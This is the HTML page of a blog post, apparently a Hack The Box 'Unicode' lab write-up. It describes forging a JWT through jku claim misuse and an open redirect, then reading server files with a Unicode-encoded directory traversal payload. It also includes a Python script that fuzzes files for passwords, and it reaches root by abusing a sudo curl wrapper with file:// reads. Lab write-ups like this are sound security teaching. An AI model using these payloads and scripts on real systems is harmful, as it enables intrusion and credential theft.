@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Unicode Hackthebox writeup</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="0xMesbaha">
+  <meta name="description" content="In This medium Box we are playing with JWT Tokens in specific the jku Claim Misuse , which will let us login as admin account then we will use the Unicode Encoding to read files on the system. Eventually we will find a password for user then ssh to login. for the root part we are abusing the sudo privilege on a binary which can read files on the system.
+">
+
+  
+  
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@gohugoio">
+    <meta name="twitter:title" content="Unicode Hackthebox writeup">
+    <meta name="twitter:description" content="In This medium Box we are playing with JWT Tokens in specific the jku Claim Misuse , which will let us login as admin account then we will use the Unicode Encoding to read files on the system. Eventually we will find a password for user then ssh to login. for the root part we are abusing the sudo privilege on a binary which can read files on the system.
+">
+    <meta name="twitter:image" content="/media/unicode/20220506203915.png">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Unicode Hackthebox writeup">
+  <meta property="og:description" content="In This medium Box we are playing with JWT Tokens in specific the jku Claim Misuse , which will let us login as admin account then we will use the Unicode Encoding to read files on the system. Eventually we will find a password for user then ssh to login. for the root part we are abusing the sudo privilege on a binary which can read files on the system.
+">
+  <meta property="og:url" content="/post/unicode/">
+  <meta property="og:image" content="/media/unicode/20220506203915.png">
+
+
+
+
+<meta name="generator" content="Hugo 0.86.1">
+
+
+<link rel="canonical" href="/post/unicode/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="0xMesbaha">
+<meta name="msapplication-tooltip" content="0xMesbaha">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.gif" as="image">
+<link rel="preload" href="/images/test.jpg" as="image">
+
+
+<style>
+  body {
+    background: rgb(244, 243, 241) url('/images/test.jpg') repeat fixed;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href=""><img class="avatar" src="/images/avatar.gif" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="">0xMesbaha</a></h2>
+  
+  <p class="subtitle"></p>
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/">Posts</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="//github.com/hussienMisbah" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//medium.com/@mesbaha" rel="me" title="Medium" aria-label="Medium">
+            <span class="icon icon-medium" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/hussien-6331151b2" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Unicode Hackthebox writeup</h1>
+      <p class="post-meta">@0xMesbaha · May 7, 2022 · 5 min read</p>
+    </header>
+    <article class="post-content"><p>In This medium Box we are playing with JWT Tokens in specific the jku Claim Misuse , which will let us login as admin account then we will use the Unicode Encoding to read files on the system. Eventually we will find a password for user then ssh to login. for the root part we are abusing the sudo privilege on a binary which can read files on the system.</p>
+<h1 id="scanning">Scanning</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -A -T5 10.10.11.126 -oN nmap/intial.txt
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">3072</span> fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-generator: Hugo 0.83.1
+|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Hackmedia
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>and the full port scan doesn&rsquo;t reveal more ports.</p>
+<h1 id="enumeration">Enumeration</h1>
+<p>As we only have the web service to enumerate let&rsquo;s get into it:</p>
+<p><img src="/media/unicode/20220506204508.png" alt="error"></p>
+<p>static page doesn&rsquo;t tell much , it has Login and register functions. we can try to do some authentication bypass at login But no results. so let&rsquo;s create an account and login with it</p>
+<p>Once we login we have this <code>/dashboard</code> page :</p>
+<p><img src="/media/unicode/20220506204717.png" alt="error"></p>
+<p>it also has an upload function we can try uploading files But doesn&rsquo;t reveal any indicator where it is uploaded. so we can leave at as the 2nd option for us</p>
+<p>we can notice also the cookie we have :</p>
+<p><img src="/media/unicode/20220506204858.png" alt="error"></p>
+<p>Seems like JWT thing we can take it and paste it into <a href="https://jwt.io/">jwt.io</a></p>
+<p><img src="/media/unicode/20220506205319.png" alt="error"></p>
+<p>we can see the url <code>http://hackmedia.htb/static/jwks.json</code>  , adding the  <code>hackmedia.htb</code> to the <code>/etc/hosts</code> then viewing the page :</p>
+<p><img src="/media/unicode/20220506205439.png" alt="error"></p>
+<p>so it seems it visits this page for the verification process , searching for JWT JKU attacks found this great Article <a href="https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c">Here</a> and it looks exactly like the situation we have.</p>
+<p><strong>Briefly we will :</strong></p>
+<p>1- Generate public and private key and add them as a signature for the JWT token and change the username to <strong>admin</strong></p>
+<p>2- in the <code>jwks.json</code>  modify the <strong>n</strong> value with the one we got at generation</p>
+<p>3- modify the JKU with your host then host the <code>jwks.json</code> at our http server .</p>
+<p>By hosting it and make the web application visit us to verify we will login with our forged JWT.</p>
+<p>using <a href="https://mkjwk.org/">here</a> with the following options:</p>
+<p><img src="/media/unicode/20220506210001.png" alt="error"></p>
+<p>using the private and public keys at the signature at <code>jwt.io</code> , and take the <strong>n</strong> value to modify the <code>jwks.json</code> we will host</p>
+<p><img src="/media/unicode/20220506210334.png" alt="error"></p>
+<p>now modify the JKU, username and the Signature:</p>
+<p><img src="/media/unicode/20220506210527.png" alt="error"></p>
+<p>now using that JWT as our new cookie we got this and it didn&rsquo;t even make the request to our side.</p>
+<p><img src="/media/unicode/20220506210617.png" alt="error"></p>
+<p>digging more and using dirsearch found :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ae81ff">308</span>   266B   http://10.10.11.126:80/dashboard    -&gt; REDIRECTS TO: http://10.10.11.126/dashboard/
+<span style="color:#ae81ff">308</span>   262B   http://10.10.11.126:80/display    -&gt; REDIRECTS TO: http://10.10.11.126/display/
+<span style="color:#ae81ff">308</span>   258B   http://10.10.11.126:80/error    -&gt; REDIRECTS TO: http://10.10.11.126/error/
+<span style="color:#ae81ff">308</span>   264B   http://10.10.11.126:80/internal    -&gt; REDIRECTS TO: http://10.10.11.126/internal/
+<span style="color:#ae81ff">308</span>   258B   http://10.10.11.126:80/login    -&gt; REDIRECTS TO: http://10.10.11.126/login/
+<span style="color:#ae81ff">308</span>   262B   http://10.10.11.126:80/pricing    -&gt; REDIRECTS TO: http://10.10.11.126/pricing/
+<span style="color:#ae81ff">308</span>   264B   http://10.10.11.126:80/redirect    -&gt; REDIRECTS TO: http://10.10.11.126/redirect/
+<span style="color:#ae81ff">308</span>   264B   http://10.10.11.126:80/register    -&gt; REDIRECTS TO: http://10.10.11.126/register/
+</code></pre></div><p>and trying the following it makes the request to our side :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">http://10.10.11.126/redirect?url=10.10.16.39
+</code></pre></div><p><img src="/media/unicode/20220506210957.png" alt="error"></p>
+<p>We can try modifying the JKU again with :</p>
+<p><img src="/media/unicode/20220506211117.png" alt="error"></p>
+<p>we also got :</p>
+<p><img src="/media/unicode/20220506211149.png" alt="error"></p>
+<p>maybe it is checking for the word &ldquo;static&rdquo; we can try :</p>
+<p><img src="/media/unicode/20220506211238.png" alt="error"></p>
+<p>sending the cookie finally we are in :</p>
+<p><img src="/media/unicode/20220506211310.png" alt="error"></p>
+<p><!-- raw HTML omitted --><strong>Note</strong> :Don&rsquo;t close your http server as it will request the verify with each request issued<!-- raw HTML omitted --></p>
+<h1 id="foothold">Foothold</h1>
+<p>visiting the <strong>last quarter</strong> we can find it issues this request :</p>
+<pre><code>http://10.10.11.126/display/?page=quarterly.pdf
+</code></pre><p>we can try directory traversal But it fails , we can make use of the <a href="https://owasp.org/www-community/attacks/Unicode_Encoding">Unicode_Encoding</a> as the machine name suggests , and using this payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">page<span style="color:#f92672">=</span>%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/passwd
+</code></pre></div><p><img src="/media/unicode/20220506211903.png" alt="error"></p>
+<p>It works , we can try to read the ssh key for the user <strong>code</strong> But we can&rsquo;t. so we can start fuzzing different files on the machine until we got a password for our foothold.</p>
+<p>From the <code>/etc/passwd</code> we can see it has the MYSQL and ngnix Services running we can read their configuration files.</p>
+<p>searching online found these default configuration files :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/etc/mysql/my.cnf
+/var/lib/mysql/my.cnf
+/var/log/mysql.log
+/etc/nginx/nginx.conf 
+/etc/nginx/sites-available/default
+</code></pre></div><p>i added some files as well and write down this script searching for passwords:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python3</span>
+<span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> time
+
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://10.10.11.126/display/?page=</span><span style="color:#e6db74">%E</span><span style="color:#e6db74">F%B8%B0/</span><span style="color:#e6db74">%E</span><span style="color:#e6db74">F%B8%B0/</span><span style="color:#e6db74">%E</span><span style="color:#e6db74">F%B8%B0/</span><span style="color:#e6db74">%E</span><span style="color:#e6db74">F%B8%B0/</span><span style="color:#e6db74">%E</span><span style="color:#e6db74">F%B8%B0&#39;</span>
+
+cookie <span style="color:#f92672">=</span>{
+<span style="color:#e6db74">&#39;auth&#39;</span> : <span style="color:#e6db74">&#39;&lt;your_auth&gt;&#39;</span>	
+}
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;wordlist.txt&#39;</span>) <span style="color:#66d9ef">as</span> wordlist :
+	<span style="color:#66d9ef">for</span> word <span style="color:#f92672">in</span> wordlist:
+		r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">+</span>word<span style="color:#f92672">.</span>strip(),cookies<span style="color:#f92672">=</span>cookie)
+
+		<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;font&#39;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text <span style="color:#f92672">and</span> <span style="color:#e6db74">&#39;animation&#39;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text :
+			print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;file </span><span style="color:#e6db74">{</span>word<span style="color:#f92672">.</span>strip()<span style="color:#e6db74">}</span><span style="color:#e6db74"> : 404 NOTFOUND&#34;</span>)
+		<span style="color:#66d9ef">else</span> :
+			print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;file </span><span style="color:#e6db74">{</span>word<span style="color:#f92672">.</span>strip()<span style="color:#e6db74">}</span><span style="color:#e6db74"> : 200 OK&#34;</span>)
+			<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;pass&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>lower() :
+				print(<span style="color:#e6db74">&#39;-&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">50</span>)
+				print(r<span style="color:#f92672">.</span>text)
+				print(<span style="color:#e6db74">&#39;-&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">50</span>)
+
+		<span style="color:#75715e">#time.sleep(3)</span>
+</code></pre></div><p><img src="/media/unicode/20220506224248.png" alt="error"></p>
+<p>we can see the comment <code>#change the user password from db.yaml</code> .we can also it reveals other directories at the home of the user code</p>
+<pre><code>/home/code/coder/static/styles/
+/home/code/app/
+</code></pre><p>Eventually will find out the <code>db.yaml</code> is at <code>/home/code/coder/db.yaml</code> :</p>
+<p><img src="/media/unicode/20220506224642.png" alt="error"></p>
+<p>using this password we can login with ssh successfully</p>
+<p><img src="/media/unicode/20220506224830.png" alt="error"></p>
+<h1 id="privilege-escalation">Privilege escalation</h1>
+<p>Examining the binary we have :</p>
+<p><img src="/media/unicode/20220506225759.png" alt="error"></p>
+<p>so it seems it can take a url and download the content into a file we can read latter:</p>
+<p><img src="/media/unicode/20220506231218.png" alt="error"></p>
+<p>After some tinkering around , we can use the <code>File://</code> wrapper to read local files :&quot;</p>
+<p><img src="/media/unicode/20220506232454.png" alt="error"></p>
+<p>and Finally you can read the flag with <code>File:///root/root.txt</code></p>
+<h1 id="bonus-after-root">[BONUS] After root</h1>
+<p>Downloading the Binary and start analyzing it , searching online found some tools which can help us de-compile a python binary and the binary we have looks like a python binary indeed</p>
+<p><img src="/media/unicode/20220507100201.png" alt="error"></p>
+<p>commands used :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone https://github.com/LucifielHack/pyinstxtractor.git
+git clone https://github.com/LucifielHack/pycdc.git 
+wget https://github.com/Kitware/CMake/releases/download/v3.23.1/cmake-3.23.1.tar.gz
+tar xzvf cmake-3.23.1.tar.gz
+cd cmake-3.23.1
+./bootstrap
+make
+sudo make install
+cmake ../pycdc/CMakeLists.txt  
+make ../pycdc/
+python3 pyinstxtractor.py &lt;binary&gt;
+./pycdc /binary_extracted/binary.pyc
+</code></pre></div><p><img src="/media/unicode/20220507100601.png" alt="error"></p>
+<p>And it seems to have a blacklist , also it uses the curl command to download the files . and if we searched online how to read localfiles with curl will see using the <code>File://</code> wrapper as we did.</p></article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/hackthebox"><span class="tag">Hackthebox</span></a></li>
+        
+          <li><a href="/tags/jwt"><span class="tag">JWT</span></a></li>
+        
+          <li><a href="/tags/directory-traversal"><span class="tag">Directory-Traversal</span></a></li>
+        
+          <li><a href="/tags/decompile-binary"><span class="tag">Decompile-Binary</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        © all rights reserved for 0xMesbaha.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2022 0xMesbaha</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
